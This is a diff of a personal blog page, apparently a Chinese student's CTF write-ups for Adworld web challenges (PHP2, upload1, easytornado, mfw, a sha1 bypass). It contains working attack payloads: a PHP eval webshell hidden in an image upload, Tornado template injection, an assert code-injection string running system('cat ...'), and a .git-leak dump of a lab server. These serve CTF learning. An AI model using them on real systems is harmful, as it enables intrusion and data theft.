@@ -12,7 +12,7 @@
 
 
 
-<title>攻防世界刷题 php2,upload1 | overnight-miss-you</title>
+<title>攻防世界刷题 easytornado，mfw，极客大挑战 | overnight-miss-you</title>
 
 
 
@@ -368,7 +368,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">攻防世界刷题 php2,upload1</h1>
+            <h1 class="post-title">攻防世界刷题 easytornado，mfw，极客大挑战</h1>
             
                 <div class="post-meta">
                     
@@ -377,7 +377,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">October 16, 2020&nbsp;&nbsp;21:46:24</a>
+                        Date: <a href="#">October 17, 2020&nbsp;&nbsp;22:36:33</a>
                         </span>
                     
                     
@@ -386,34 +386,58 @@
         </header>
 
         <div class="post-content">
-            <h2 id="划水博客第十單"><a href="#划水博客第十單" class="headerlink" title="划水博客第十單"></a>划水博客第十單</h2><p>依旧是在攻防世界看wp划水。</p>
-<h5 id="1-PHP2"><a href="#1-PHP2" class="headerlink" title="1==PHP2"></a>1==PHP2</h5><p>打开链接。只有一段<img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016193914052.png" alt="image-20201016193914052"></p>
-<p>首先基本操作。<code>F12</code>，没啥子发现。接着扫描一下目录。</p>
-<p>简单说做个笔记。使用dirsearch扫描的代码：<code>python dirsearch.py -u +网址+ -e * </code>,加上<code>-s 1</code>会仔细点。</p>
-<p>结果只发现一个<code>index.php</code>。。没啥子用呀。（我用御剑也扫不到.phps的文件。。）</p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/00B7F523.png" alt="img"></p>
-<p><code>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。</code></p>
-<p>得到主页的源码。掉头发分析一波。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===$_GET[id]) &#123;<span class="comment">//id不能=admin</span></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);<span class="comment">//通过url解码一次后</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">&quot;admin&quot;</span>)<span class="comment">//要==admin,,所以只要编码一个字符就可以了；</span></span><br><span class="line">&#123;           <span class="comment">//a的URL编码是%61..因为上面需要解码，所以我们需要加密一次%2561；</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+            <h2 id="划水博客第十一D"><a href="#划水博客第十一D" class="headerlink" title="划水博客第十一D"></a>划水博客第十一D</h2><p>成功混为划水队第一番队队长。</p>
+<h5 id="1-easytornado"><a href="#1-easytornado" class="headerlink" title="1==easytornado"></a>1==easytornado</h5><p><em>Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</em></p>
+<p>打开连接，发现三个txt文件。</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017111021992.png" alt="image-20201017111021992"></p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017111129014.png" alt="image-20201017111129014"></p>
+<p>想尝试一下：：直接打开<code>/fllllllllllllag</code>。。直接报错了（划线需要记一下，要考的）</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017113614230.png" alt="image-20201017113614230"></p>
+<p>看到第二个提示是<code>render</code>(服务器渲染函数)。可能是模板注入；</p>
+<p>然后又跑回报错处，把Error改为其他的看看，发现这里就是模板注入点。。<a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107475107?utm_medium=distribute.pc_relevant.none-task-blog-utm_term-3&spm=1001.2101.3001.4242">大佬nb</a></p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017113748107.png" alt="image-20201017113748107"></p>
+<p>分析一下：：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))<span class="comment">//即先将filenamemd5加密，再将cookie_secret与md5加密后的filename进行md5加密。</span></span><br></pre></td></tr></table></figure>
 
-<p>输入<code>id=%2561dmin</code>即可得到flag。</p>
-<h5 id="2-upload1"><a href="#2-upload1" class="headerlink" title="2==upload1"></a>2==upload1</h5><p>打开链接。一个文件上传的接口。随便上传一个txt文件。提示只能上传一张图片。</p>
-<p>想到将一句话代码放到图片里上传，在用蚁剑连接。想到就干。</p>
-<p>首先在txt文件下写入一句话代码..<code>&lt;?php @eval(_POST[&quot;a&quot;];?&gt;</code>,并改成php文件</p>
-<p>在随便搞个图片，使用cmd将将两个合成为一个图片码；</p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016212806501.png" alt="image-20201016212806501"></p>
-<p>在上传文件，并抓包。</p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016213220948.png" alt="image-20201016213220948"></p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016213313926.png"></p>
-<p>显示上传成功。在用蚁剑连接。</p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016213633996.png" alt="image-20201016213633996"></p>
-<p>后面有尝试了一下，随便上传一张图，抓包，把图片内容改为一句话木马，在改为php格式也行。</p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016214407848.png" alt="image-20201016214407848"></p>
-<h4 id="！！！这次的划水博客就这样完了，头发掉一把，去跟五胞胎老婆们出去蜜个月，11个人回！！！-σﾟ∀ﾟ-σ-☆"><a href="#！！！这次的划水博客就这样完了，头发掉一把，去跟五胞胎老婆们出去蜜个月，11个人回！！！-σﾟ∀ﾟ-σ-☆" class="headerlink" title="！！！这次的划水博客就这样完了，头发掉一把，去跟五胞胎老婆们出去蜜个月，11个人回！！！(σﾟ∀ﾟ)σ..:*☆"></a>！！！这次的划水博客就这样完了，头发掉一把，去跟五胞胎老婆们出去蜜个月，11个人回！！！(σﾟ∀ﾟ)σ..:*☆</h4><p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/r1200.jpg" alt="1"></p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/ter1200.jpg" alt="2"></p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/0_master1200.jpg" alt="3"></p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/8_p0_master1200.jpg" alt="4"></p>
-<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/951_p0_master1200.jpg" alt="5"></p>
+<p>我们已经知道flag在哪了，只要知道<code>cookie_secret</code>就行了。。。。又是不知道的东西。。</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/040D3312.jpg" alt="img"></p>
+<p>看大佬的wp才知道：：在<code>ornado</code>模板里可以使用<code>handler.settings</code>来访问<code>cookie_secret</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=&#123;&#123;handler.settings&#125;&#125;<span class="comment">//得到cookie_secret</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017114511116.png" alt="image-20201017114511116"></p>
+<p>然后通过md5加密就好了</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017123449904.png" alt="image-20201017123449904"></p>
+<p>最后输入<code>?filename=/fllllllllllllag&amp;filehash=2d1574db11b73f3f45e33b484b2297b2</code>即可到的flag。</p>
+<h5 id="2-mfw"><a href="#2-mfw" class="headerlink" title="2==mfw"></a>2==mfw</h5><p>打开链接。三个标题都点一下。发现了一点可疑的地方。</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017212012453.png" alt="image-20201017212012453"></p>
+<p>用dirsearch 扫一下；发现，存在<code>.git</code>泄露</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017212357409.png" alt="image-20201017212357409"></p>
+<p>使用Githacker下载文件；</p>
+<p><code>python3 GitHacker.py http://220.249.52.133:33512/.git/</code>(后面四个是在templates文件夹中)</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017212750260.png" alt="image-20201017212750260"></p>
+<p>打开flag.php文件，什么都么有。在打开index.php，发现php的源代码。抓头分析一下。。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);<span class="comment">//不能有..不然就退出。</span></span><br><span class="line">    <span class="comment">//assert会将字符串当做代码来执行。所以我们知道在第一波就构造处前面错后面对的代码就可能可行</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以构造：：<code>page=123&#39;)or system(&quot;cat templates/flag.php&quot;);//</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解释一下：</span><br><span class="line"></span><br><span class="line">我们输入的：：page&#x3D;123&#39;)or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;</span><br><span class="line">实际上传的：：assert(&quot;strpos(&#39;templates page&#x3D;123&#39;)(闭合前面的&#39;)并报错执行后面的代码）or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F; (到这直接停，，注释掉后面).php)&#x3D;&#x3D;&#x3D;false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后在源代码中看到flag。</p>
+<h6 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="极客大挑战"></a>极客大挑战</h6><p>打开链接，啥都没有。基本习惯<code>F12</code>。在HackBar中使用POST请求时显示了源代码（瞎猫碰到死耗子）。</p>
+<p>接着又是抓头分析代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) &#123;<span class="comment">//只能是post请求才行。。</span></span><br><span class="line">header(<span class="string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;roam1&#x27;</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;roam2&#x27;</span>]))&#123;<span class="comment">//需要同时post两个值roam1和roam2</span></span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($_POST[<span class="string">&#x27;roam1&#x27;</span>] !== $_POST[<span class="string">&#x27;roam2&#x27;</span>] &amp;&amp; sha1($_POST[<span class="string">&#x27;roam1&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;roam2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//roam1和roam2不能相等并且通过sha1加密后还要相等。。。后来寝室大佬说可以让 sha1只能处理字符串，不能处理数组。所以可以把roam1.roam2构造成数组，使两边同时报错，变向相等。就可以绕过了。大佬nb！！！</span></span><br><span class="line">        phpinfo();  <span class="comment">// collect information from phpinfo!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\86159\AppData\Roaming\Typora\typora-user-images\image-20201017221220426.png" alt="image-20201017221220426"></p>
+<p>跳转到phpinfo();在里面找有没有flag。找到了</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017221517641.png" alt="image-20201017221517641"></p>
+<p>试着打开。</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017221647100.png" alt="image-20201017221647100"></p>
+<p>报错了？？？   假的！！！  真的报错：</p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017222000523.png" alt="image-20201017222000523"></p>
+<p>这波操作秀的一批。。</p>
+<p>最后在响应头中发现flag。</p>
+<h4 id="！！！！这个次的划水博客就到这了，我要去陪楪祈-ye-qi-去玩花绳了！！！！-o-尸-’’☆ミ☆ミ"><a href="#！！！！这个次的划水博客就到这了，我要去陪楪祈-ye-qi-去玩花绳了！！！！-o-尸-’’☆ミ☆ミ" class="headerlink" title="！！！！这个次的划水博客就到这了，我要去陪楪祈(ye qi)去玩花绳了！！！！(ｏ^-^)尸~’’☆ミ☆ミ"></a>！！！！这个次的划水博客就到这了，我要去陪楪祈(ye qi)去玩花绳了！！！！(ｏ^-^)尸~’’☆ミ☆ミ</h4><p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/3110.jpg" alt="3110"></p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/indaex.jpg" alt="indaex"></p>
+<p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/asdAesfa.gif" alt="asdAesfa"></p>
 
         </div>
 
@@ -428,7 +452,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://example.com/2020/10/16/10/">http://example.com/2020/10/16/10/</a></span>
+                        <span><a href="http://example.com/2020/10/17/11/">http://example.com/2020/10/17/11/</a></span>
                     </p>
                 
                 
@@ -461,10 +485,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/10/17/11/">攻防世界刷题 easytornado，mfw，极客大挑战</a>
             
-            
-            <a class="next" rel="next" href="/2020/10/15/9/">攻防世界刷题 web,newscenter</a>
+            <a class="next" rel="next" href="/2020/10/16/10/">攻防世界刷题 php2,upload1</a>
             
         </section>
         
